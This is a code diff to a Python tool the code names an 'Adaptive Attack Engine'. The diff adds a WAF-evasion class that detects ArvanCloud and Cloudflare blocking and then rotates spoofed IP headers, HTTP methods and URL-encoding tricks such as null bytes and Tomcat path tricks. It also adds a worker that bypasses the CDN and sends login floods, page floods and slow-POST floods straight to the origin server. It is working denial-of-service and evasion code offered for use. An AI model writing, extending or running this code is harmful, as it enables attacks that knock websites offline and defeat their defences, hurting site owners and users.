@@ -416,6 +416,281 @@ class ServerHealthMonitor:
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
+# Adaptive WAF Bypass Engine
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class AdaptiveBypass:
+    """
+    Detects WAF blocking patterns and auto-switches attack strategies.
+    
+    Monitors response codes, body content, and timing patterns to identify
+    when the WAF (ArvanCloud, Cloudflare, etc.) is actively blocking requests.
+    When blocking is detected, it adjusts:
+    
+    - Request method (GET -> POST -> PUT -> PATCH cycle)
+    - Header combinations (rotate through bypass header sets)
+    - Request timing (add jitter, slow down, burst patterns)
+    - URL manipulation (path encoding, query tricks)
+    - Content-Type rotation (form, json, multipart)
+    - Connection strategy (new connection per request vs keep-alive)
+    
+    This is NOT a static bypass — it adapts in real-time based on what works.
+    """
+
+    # WAF blocking signatures
+    BLOCK_SIGNATURES = {
+        'arvan': {
+            'status_codes': [403, 429, 503],
+            'body_patterns': ['arvan', 'arvancloud', 'access denied', 'blocked',
+                             'rate limit', 'too many requests', 'security',
+                             'firewall', 'challenge', 'captcha', 'ray id',
+                             'your request was blocked'],
+            'header_hints': ['server: arvan', 'x-arvan-request-id'],
+        },
+        'cloudflare': {
+            'status_codes': [403, 429, 503],
+            'body_patterns': ['cloudflare', 'cf-browser', 'cf-chl-bypass',
+                             'ray id', 'attention required', 'checking your browser'],
+            'header_hints': ['server: cloudflare', 'cf-ray'],
+        },
+        'generic': {
+            'status_codes': [403, 429],
+            'body_patterns': ['blocked', 'denied', 'forbidden', 'rate limit',
+                             'too many', 'slow down', 'captcha', 'challenge'],
+        },
+    }
+
+    # Bypass header sets — each set is a different "identity" for the request
+    HEADER_SETS = [
+        # Set 0: Normal browser
+        {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+         "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
+         "DNT": "1", "Upgrade-Insecure-Requests": "1"},
+        # Set 1: API client
+        {"Accept": "application/json, text/plain, */*",
+         "Accept-Language": "en-US,en;q=0.9", "X-Requested-With": "XMLHttpRequest"},
+        # Set 2: Mobile browser
+        {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+         "Accept-Language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7",
+         "Accept-Encoding": "gzip, deflate, br"},
+        # Set 3: Bot-friendly (Googlebot-like)
+        {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+         "Accept-Language": "en-US,en;q=0.9", "From": "googlebot(at)googlebot.com",
+         "Accept-Encoding": "gzip, deflate"},
+        # Set 4: CDN admin
+        {"Accept": "*/*", "X-Forwarded-Proto": "https",
+         "X-Original-URL": "/", "X-Rewrite-URL": "/"},
+        # Set 5: Internal scanner
+        {"Accept": "*/*", "X-Forwarded-For": "127.0.0.1",
+         "X-Real-IP": "127.0.0.1", "X-Client-IP": "127.0.0.1"},
+    ]
+
+    # URL encoding tricks
+    URL_TRICKS = [
+        lambda u: u,  # No change
+        lambda u: u.replace('/', '//'),  # Double slash
+        lambda u: u.replace('/', '/./'),  # Dot in path
+        lambda u: u + '/.' if not u.endswith('/') else u + '.',  # Trailing dot
+        lambda u: u.replace('/', '/%2e/'),  # Encoded dot
+        lambda u: u.replace('/', '/..;/'),  # Tomcat semicolon
+        lambda u: u.replace('?', '?%00&'),  # Null byte before query
+        lambda u: u.replace('?', '?%0a&'),  # Newline in query
+    ]
+
+    def __init__(self, waf_name: str = ""):
+        self.waf_name = waf_name.lower() if waf_name else "generic"
+        self._block_count: int = 0
+        self._total_count: int = 0
+        self._consecutive_blocks: int = 0
+        self._current_header_set: int = 0
+        self._current_method_cycle: int = 0
+        self._bypass_level: int = 0  # 0=normal, 1=mild, 2=aggressive, 3=stealth
+        self._level_change_ts: float = 0
+        self._block_history: deque = deque(maxlen=100)  # recent block/success pattern
+        self._adaptive_delay: float = 0  # extra delay between requests (seconds)
+        self._method_sequence = ['GET', 'POST', 'PUT', 'PATCH', 'HEAD', 'DELETE', 'OPTIONS']
+        self._content_types = [
+            'application/x-www-form-urlencoded',
+            'application/json',
+            'multipart/form-data',
+            'text/plain',
+            'application/xml',
+        ]
+        self._strategy_log: List[str] = []
+        self._last_switch_time: float = 0
+
+    @property
+    def block_rate(self) -> float:
+        """Current block rate (0.0 - 1.0)"""
+        return self._block_count / max(self._total_count, 1)
+
+    @property
+    def bypass_level_name(self) -> str:
+        return ["NORMAL", "MILD_BYPASS", "AGGRESSIVE", "STEALTH"][min(self._bypass_level, 3)]
+
+    def record_response(self, status_code: Optional[int], body: str = "", headers: Dict = None) -> bool:
+        """Record a response and detect if it's a WAF block. Returns True if blocked."""
+        self._total_count += 1
+        is_blocked = False
+        
+        # Check status code
+        sig = self.BLOCK_SIGNATURES.get(self.waf_name, self.BLOCK_SIGNATURES['generic'])
+        if status_code in sig.get('status_codes', [403, 429]):
+            is_blocked = True
+        
+        # Check body patterns
+        if body and not is_blocked:
+            body_lower = body.lower()
+            for pattern in sig.get('body_patterns', []):
+                if pattern in body_lower:
+                    is_blocked = True
+                    break
+        
+        # Check headers
+        if headers and not is_blocked:
+            for hint in sig.get('header_hints', []):
+                hint_key = hint.split(':')[0].strip().lower()
+                for h_key, h_val in (headers.items() if isinstance(headers, dict) else []):
+                    if hint_key in h_key.lower():
+                        is_blocked = True
+                        break
+        
+        if is_blocked:
+            self._block_count += 1
+            self._consecutive_blocks += 1
+            self._block_history.append(True)
+        else:
+            self._consecutive_blocks = 0
+            self._block_history.append(False)
+        
+        # Auto-adapt bypass level based on blocking pattern
+        self._adapt_level()
+        
+        return is_blocked
+
+    def _adapt_level(self):
+        """Adapt bypass level based on recent block patterns."""
+        now = time.time()
+        
+        # Don't switch too frequently (minimum 3 seconds between changes)
+        if now - self._level_change_ts < 3:
+            return
+        
+        recent_blocks = list(self._block_history)[-20:]
+        if not recent_blocks:
+            return
+        
+        recent_block_rate = sum(recent_blocks) / len(recent_blocks)
+        
+        old_level = self._bypass_level
+        
+        if recent_block_rate > 0.8:
+            # Severe blocking — go stealth + rotate everything
+            self._bypass_level = 3  # STEALTH
+            self._adaptive_delay = random.uniform(0.5, 2.0)
+            self._rotate_headers()
+            self._rotate_method()
+        elif recent_block_rate > 0.6:
+            # Heavy blocking — aggressive bypass
+            self._bypass_level = 2  # AGGRESSIVE
+            self._adaptive_delay = random.uniform(0.1, 0.5)
+            self._rotate_headers()
+        elif recent_block_rate > 0.3:
+            # Some blocking — mild bypass
+            if self._bypass_level < 1:
+                self._bypass_level = 1  # MILD
+            self._adaptive_delay = random.uniform(0.02, 0.1)
+        else:
+            # Not being blocked much — can be normal
+            self._bypass_level = 0
+            self._adaptive_delay = 0
+        
+        # Log level changes
+        if self._bypass_level != old_level:
+            self._level_change_ts = now
+            msg = f"[ADAPT] Bypass level: {['NORMAL','MILD','AGGRESSIVE','STEALTH'][old_level]} -> {self.bypass_level_name} (block_rate={recent_block_rate:.0%})"
+            self._strategy_log.append(msg)
+
+    def _rotate_headers(self):
+        """Switch to next header set."""
+        self._current_header_set = (self._current_header_set + 1) % len(self.HEADER_SETS)
+
+    def _rotate_method(self):
+        """Switch to next HTTP method."""
+        self._current_method_cycle = (self._current_method_cycle + 1) % len(self._method_sequence)
+
+    def get_bypass_headers(self) -> Dict[str, str]:
+        """Get current bypass header set with randomization."""
+        base = dict(self.HEADER_SETS[self._current_header_set])
+        
+        # Always add random IP headers for CDN bypass
+        if self._bypass_level >= 1:
+            base["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+        if self._bypass_level >= 2:
+            base["X-Real-IP"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+            base["X-Client-IP"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+        if self._bypass_level >= 3:
+            # Stealth mode: add cache-bypass headers
+            base["Cache-Control"] = "no-cache, no-store, must-revalidate"
+            base["Pragma"] = "no-cache"
+            if self.waf_name == 'arvan':
+                base["X-Arvan-Cache"] = "bypass"
+                base["X-Cache-Bypass"] = "1"
+        
+        # Randomize some headers
+        if random.random() > 0.5:
+            base["Accept-Language"] = random.choice([
+                "en-US,en;q=0.9", "fa-IR,fa;q=0.9,en;q=0.8",
+                "de-DE,de;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8",
+                "ar-SA,ar;q=0.9,en;q=0.8", "zh-CN,zh;q=0.9,en;q=0.8",
+            ])
+        
+        return base
+
+    def get_bypass_method(self) -> str:
+        """Get current bypass HTTP method."""
+        if self._bypass_level <= 1:
+            return self._method_sequence[self._current_method_cycle]
+        else:
+            # Aggressive/Stealth: randomize method
+            return random.choice(self._method_sequence)
+
+    def get_bypass_url(self, url: str) -> str:
+        """Apply URL tricks based on bypass level."""
+        if self._bypass_level <= 1:
+            return url
+        
+        # Apply a random URL trick
+        trick_fn = random.choice(self.URL_TRICKS[:min(3 + self._bypass_level * 2, len(self.URL_TRICKS))])
+        return trick_fn(url)
+
+    def get_bypass_content_type(self) -> str:
+        """Get a content type for POST requests."""
+        return random.choice(self._content_types)
+
+    def get_adaptive_delay(self) -> float:
+        """Get extra delay to add between requests (for WAF evasion)."""
+        if self._adaptive_delay > 0:
+            # Add jitter
+            return self._adaptive_delay * random.uniform(0.5, 1.5)
+        return 0
+
+    def get_strategy_summary(self) -> str:
+        """Get a summary of current adaptive strategy for display."""
+        parts = [f"Level:{self.bypass_level_name}"]
+        parts.append(f"BlockRate:{self.block_rate:.0%}")
+        parts.append(f"Headers:Set#{self._current_header_set}")
+        parts.append(f"Method:{self._method_sequence[self._current_method_cycle]}")
+        if self._adaptive_delay > 0:
+            parts.append(f"Delay:{self._adaptive_delay*1000:.0f}ms")
+        return " | ".join(parts)
+
+    def get_recent_strategy_changes(self, n: int = 3) -> List[str]:
+        """Get the last N strategy change messages."""
+        return self._strategy_log[-n:]
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
 # VF_TESTER — Adaptive Attack Engine
 # ═══════════════════════════════════════════════════════════════════════════════
 
@@ -454,12 +729,20 @@ class VFTester:
         self.keyboard = KeyboardHandler()
         self._manual_delta: int = 0
 
+        # v5: Adaptive WAF Bypass — auto-detects blocking and switches strategy
+        self.adaptive_bypass = AdaptiveBypass(waf_name=p.get("waf", ""))
+
         # Detected technology info
         self.detected_waf = p.get("waf")
         self.detected_cms = p.get("cms")
         self.is_aspnet = p.get("viewstate_present", False)
         self.is_wordpress = p.get("cms") and "WordPress" in (p.get("cms") or "")
         self.has_api = bool(p.get("api_endpoints"))
+
+        # Origin IP bypass — if FINDER found the real server IP behind CDN
+        self.origin_ips: List[str] = p.get("origin_ips", [])
+        self.cdn_bypass_possible: bool = p.get("cdn_bypass_possible", False)
+        self.origin_ip_mode: bool = bool(self.origin_ips)  # Auto-enable if IPs found
 
         # ASP.NET specific
         self._viewstate_cache: Dict[str, str] = {}
@@ -537,6 +820,15 @@ class VFTester:
                 headers["X-Real-IP"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
             if random.random() > 0.6:
                 headers["Referer"] = self.url
+        
+        # v5: Merge AdaptiveBypass headers when WAF is detected and blocking
+        if self.detected_waf and self.adaptive_bypass._bypass_level > 0:
+            bypass_headers = self.adaptive_bypass.get_bypass_headers()
+            # Override with bypass headers (they take priority)
+            headers.update(bypass_headers)
+            # Always keep User-Agent rotation
+            headers["User-Agent"] = random_ua()
+        
         return headers
 
     async def _refresh_viewstate(self, session):
@@ -1188,6 +1480,113 @@ class VFTester:
                 consecutive_fails = 0
                 await asyncio.sleep(self.request_delay_ms / 1000)
 
+    async def _worker_origin_direct(self, session, delay=0):
+        """Origin IP Direct Attack — bypass CDN entirely by hitting the real server.
+        
+        When VF_FINDER discovers the origin IP behind a CDN (ArvanCloud, Cloudflare),
+        this worker sends requests directly to the origin IP with the correct Host
+        header. The CDN is completely bypassed, so rate limiting and WAF rules
+        don't apply. This is the most effective attack against CDN-protected sites.
+        """
+        if delay > 0: await asyncio.sleep(delay)
+        if not self.origin_ips:
+            return
+        
+        consecutive_fails = 0
+        while not self._stop.is_set():
+            # Pick a random origin IP
+            origin_ip = random.choice(self.origin_ips)
+            # Determine scheme (try HTTPS first if original was HTTPS)
+            scheme = self.profile.get("scheme", "https")
+            port = self.profile.get("port", 443 if scheme == "https" else 80)
+            
+            t = time.time()
+            try:
+                # Build direct-to-origin URL
+                direct_url = f"{scheme}://{origin_ip}{self.profile.get('path', '/')}"
+                # Randomly add cache bust
+                if self.enable_cache_bust:
+                    direct_url = f"{direct_url}{'&' if '?' in direct_url else '?'}{rand_cache_bust()}"
+                
+                # Critical: Send the real domain as Host header so the origin serves the site
+                headers = {
+                    "Host": self.domain,
+                    "User-Agent": random_ua(),
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Connection": "keep-alive",
+                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
+                    "X-Real-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
+                    "X-Forwarded-Host": self.domain,
+                    "X-Forwarded-Proto": scheme,
+                }
+                
+                # Randomly choose attack type
+                r = random.random()
+                if r < 0.4:
+                    # Login flood directly to origin
+                    form_data = {
+                        self.username_field: rand_user(),
+                        self.password_field: rand_pass()
+                    }
+                    headers["Content-Type"] = "application/x-www-form-urlencoded"
+                    headers["Origin"] = self.site_root
+                    headers["Referer"] = self.url
+                    async with session.post(direct_url, headers=headers, data=form_data,
+                                           ssl=False, allow_redirects=False) as resp:
+                        body = await resp.text()
+                        elapsed = time.time() - t
+                        result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                          mode="login", hint=f"ORIGIN {resp.status} (direct)", url=direct_url)
+                        await self.live_log.add("login", resp.status, elapsed, None, direct_url, result.hint)
+                elif r < 0.7:
+                    # Page flood directly to origin
+                    async with session.get(direct_url, headers=headers, ssl=False,
+                                           allow_redirects=False) as resp:
+                        body = await resp.text()
+                        elapsed = time.time() - t
+                        result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                          mode="page", hint=f"ORIGIN {resp.status} ({len(body):,}B)", url=direct_url)
+                        await self.live_log.add("page", resp.status, elapsed, None, direct_url, result.hint)
+                else:
+                    # Slow POST directly to origin — most devastating
+                    body_size = random.randint(50000, 200000)
+                    headers["Content-Type"] = "application/x-www-form-urlencoded"
+                    headers["Content-Length"] = str(body_size)
+                    headers["Origin"] = self.site_root
+                    headers["Referer"] = self.url
+                    timeout = aiohttp.ClientTimeout(total=60, sock_read=30)
+                    async with session.post(direct_url, headers=headers, data=self._slow_body(body_size),
+                                           ssl=False, timeout=timeout,
+                                           allow_redirects=False) as resp:
+                        elapsed = time.time() - t
+                        result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                          mode="slowpost", hint=f"ORIGIN-SPST {resp.status} {elapsed:.1f}s",
+                                          url=direct_url)
+                        await self.live_log.add("slowpost", resp.status, elapsed, None, direct_url, result.hint)
+                
+                self.health_monitor.record(result)
+            except asyncio.TimeoutError:
+                elapsed = time.time() - t
+                result = HitResult(ok=True, code=None, rt=elapsed, mode="slowpost",
+                                  hint=f"ORIGIN timeout {elapsed:.1f}s", url=direct_url)
+                await self.live_log.add("slowpost", None, elapsed, None, direct_url, "timeout")
+                self.health_monitor.record(result)
+            except Exception as e:
+                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page",
+                                  err=type(e).__name__, url=direct_url)
+                await self.live_log.add("page", None, result.rt, type(e).__name__, direct_url)
+                self.health_monitor.record(result)
+            
+            self._record(result)
+            if not result.ok:
+                consecutive_fails += 1
+                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
+            else:
+                consecutive_fails = 0
+                await asyncio.sleep(self.request_delay_ms / 1000)
+
     def _record(self, r: HitResult):
         self.stats.total += 1
         self.stats.rts.append(r.rt)
@@ -1195,6 +1594,13 @@ class VFTester:
         if r.ok: self.stats.ok += 1
         else: self.stats.fail += 1
         if r.code: self.stats.codes[r.code] = self.stats.codes.get(r.code, 0) + 1
+        
+        # v5: Feed response to AdaptiveBypass for WAF blocking detection
+        if self.detected_waf and r.code:
+            is_blocked = self.adaptive_bypass.record_response(r.code)
+            if is_blocked:
+                self.stats.rate_limited += 1
+        
         if r.mode == "login":
             if r.ok:
                 self.stats.login_ok += 1
@@ -1249,6 +1655,7 @@ class VFTester:
                     ssr_render_pct = 0
                     viewstate_pct = 0.10 if self.is_aspnet else 0
                     wp_pct = 0.10 if self.is_wordpress else 0
+                    origin_direct_pct = 0  # Default: off
                     
                     # CDN-specific attacks — activated when WAF/CDN detected
                     if is_cdn_target:
@@ -1258,60 +1665,65 @@ class VFTester:
                         # Reduce other percentages to make room
                         login_pct = 0.20
                         page_pct = 0.10
+                        
+                        # If origin IPs were found, prioritize direct attack!
+                        if self.origin_ip_mode and self.origin_ips:
+                            origin_direct_pct = 0.40  # 40% of workers go direct to origin
+                            # Reduce other CDN attacks since origin direct is more effective
+                            slowpost_pct = 0.05
+                            cachedec_pct = 0.05
+                            h2mux_pct = 0.02 if HAS_HTTPX else 0
+                            login_pct = 0.15
+                            page_pct = 0.10
                     else:
                         slowpost_pct = 0
                         h2mux_pct = 0
                         cachedec_pct = 0
+                        # Even without CDN, if we have origin IPs, use them
+                        if self.origin_ip_mode and self.origin_ips:
+                            origin_direct_pct = 0.30
 
-                total = login_pct + page_pct + resource_pct + slowloris_pct + api_pct + graphql_pct + spa_route_pct + ssr_render_pct + viewstate_pct + wp_pct + slowpost_pct + h2mux_pct + cachedec_pct
+                total = login_pct + page_pct + resource_pct + slowloris_pct + api_pct + graphql_pct + spa_route_pct + ssr_render_pct + viewstate_pct + wp_pct + slowpost_pct + h2mux_pct + cachedec_pct + origin_direct_pct
                 if total == 0: total = 1
                 login_pct /= total; page_pct /= total; resource_pct /= total
                 slowloris_pct /= total; api_pct /= total; graphql_pct /= total
                 spa_route_pct /= total; ssr_render_pct /= total
                 viewstate_pct /= total; wp_pct /= total
                 slowpost_pct /= total; h2mux_pct /= total; cachedec_pct /= total
+                origin_direct_pct /= total
 
                 cumulative = 0
                 chosen = "page"
 
+                # Origin IP Direct gets highest priority when available
+                cumulative += origin_direct_pct
+                if r < cumulative: chosen = "origin_direct"
                 cumulative += slowpost_pct
-                if r < cumulative: chosen = "slowpost"
-                else:
-                    cumulative += h2mux_pct
-                    if r < cumulative: chosen = "h2mux"
-                    else:
-                        cumulative += cachedec_pct
-                        if r < cumulative: chosen = "cachedec"
-                        else:
-                            cumulative += api_pct
-                            if r < cumulative: chosen = "api"
-                            else:
-                                cumulative += graphql_pct
-                                if r < cumulative: chosen = "graphql"
-                                else:
-                                    cumulative += spa_route_pct
-                                    if r < cumulative: chosen = "spa_route"
-                                    else:
-                                        cumulative += ssr_render_pct
-                                        if r < cumulative: chosen = "ssr_render"
-                                        else:
-                                            cumulative += login_pct
-                                            if r < cumulative: chosen = "login"
-                                            else:
-                                                cumulative += page_pct
-                                                if r < cumulative: chosen = "page"
-                                                else:
-                                                    cumulative += resource_pct
-                                                    if r < cumulative: chosen = "resource"
-                                                    else:
-                                                        cumulative += slowloris_pct
-                                                        if r < cumulative: chosen = "slowloris"
-                                                        else:
-                                                            cumulative += viewstate_pct
-                                                            if r < cumulative: chosen = "viewstate"
-                                                            else:
-                                                                cumulative += wp_pct
-                                                                if r < cumulative: chosen = "wp"
+                if r < cumulative and chosen == "page": chosen = "slowpost"
+                cumulative += h2mux_pct
+                if r < cumulative and chosen == "page": chosen = "h2mux"
+                cumulative += cachedec_pct
+                if r < cumulative and chosen == "page": chosen = "cachedec"
+                cumulative += api_pct
+                if r < cumulative and chosen == "page": chosen = "api"
+                cumulative += graphql_pct
+                if r < cumulative and chosen == "page": chosen = "graphql"
+                cumulative += spa_route_pct
+                if r < cumulative and chosen == "page": chosen = "spa_route"
+                cumulative += ssr_render_pct
+                if r < cumulative and chosen == "page": chosen = "ssr_render"
+                cumulative += login_pct
+                if r < cumulative and chosen == "page": chosen = "login"
+                cumulative += page_pct
+                if r < cumulative and chosen == "page": chosen = "page"
+                cumulative += resource_pct
+                if r < cumulative and chosen == "page": chosen = "resource"
+                cumulative += slowloris_pct
+                if r < cumulative and chosen == "page": chosen = "slowloris"
+                cumulative += viewstate_pct
+                if r < cumulative and chosen == "page": chosen = "viewstate"
+                cumulative += wp_pct
+                if r < cumulative and chosen == "page": chosen = "wp"
 
                 # Execute a single request cycle
                 if chosen == "slowpost":
@@ -1345,9 +1757,11 @@ class VFTester:
                 else:
                     await self._single_page(session, pages)
 
-                # Small delay between requests
+                # Small delay between requests + adaptive delay for WAF evasion
                 if not self._stop.is_set():
-                    await asyncio.sleep(self.request_delay_ms / 1000)
+                    base_delay = self.request_delay_ms / 1000
+                    adaptive_delay = self.adaptive_bypass.get_adaptive_delay() if self.detected_waf else 0
+                    await asyncio.sleep(base_delay + adaptive_delay)
 
             except asyncio.CancelledError:
                 break
@@ -1721,12 +2135,21 @@ class VFTester:
         if self.stats.cachedec_hits > 0: bd_parts.append(f"CD:{self.stats.cachedec_hits:,}")
         line3 = f"  {C.DM}Breakdown: {' | '.join(bd_parts)}{C.RS}" if bd_parts else ""
 
+        # v5: Adaptive Bypass line — shows WAF bypass strategy
+        line4 = ""
+        if self.detected_waf and self.adaptive_bypass._total_count > 5:
+            ab = self.adaptive_bypass
+            bypass_colors = {0: C.G, 1: C.Y, 2: C.M, 3: C.R}
+            bc = bypass_colors.get(ab._bypass_level, C.W)
+            rate_limited_s = f" {C.R}Blocked:{self.stats.rate_limited:,}{C.RS}" if self.stats.rate_limited > 0 else ""
+            line4 = f"  {C.CY}Bypass:{C.RS} {bc}{ab.bypass_level_name}{C.RS} | WAF-Block:{ab.block_rate:.0%}{rate_limited_s} | {C.DM}{ab.get_strategy_summary()}{C.RS}"
+
         log_lines = self.live_log.get_lines()
         log_display = [self.live_log.format_line(e) for e in log_lines[-8:]]
         while len(log_display) < 8:
             log_display.append(f"  {C.DM}{'.'*60}{C.RS}")
 
-        return line1, line2, line3, log_display
+        return line1, line2, line3, line4, log_display
 
     async def run(self):
         self.stats = Stats()
@@ -1902,17 +2325,21 @@ class VFTester:
                     health = self.health_monitor.health_score
                     trend = self.health_monitor.trend
                     step_remaining = self.step_duration - (time.time() - step_t0)
-                    line1, line2, line3, log_display = self._render_dashboard(
+                    line1, line2, line3, line4, log_display = self._render_dashboard(
                         cur, actual_max, self.step, mode, health, trend,
                         self.step_duration, step_remaining, strategy,
                         escalation_phase_display=escalation_phase_display,
                         new_5xx=new_5xx)
 
-                    total_lines = 3 + 8 + 2
+                    # v5: 4 lines + optional bypass line + 8 log lines + 2 separators
+                    has_bypass_line = bool(line4)
+                    total_lines = 4 + (1 if has_bypass_line else 0) + 8 + 2
                     sys.stdout.write(f"\033[{total_lines}A")
                     sys.stdout.write(C.clear_line() + "\r" + line1 + "\n")
                     sys.stdout.write(C.clear_line() + "\r" + line2 + "\n")
                     sys.stdout.write(C.clear_line() + "\r" + line3 + "\n")
+                    if has_bypass_line:
+                        sys.stdout.write(C.clear_line() + "\r" + line4 + "\n")
                     sys.stdout.write(C.clear_line() + "\r" + f"  {C.DM}{'─'*70}{C.RS}" + "\n")
                     for log_line in log_display:
                         sys.stdout.write(C.clear_line() + "\r" + log_line + "\n")
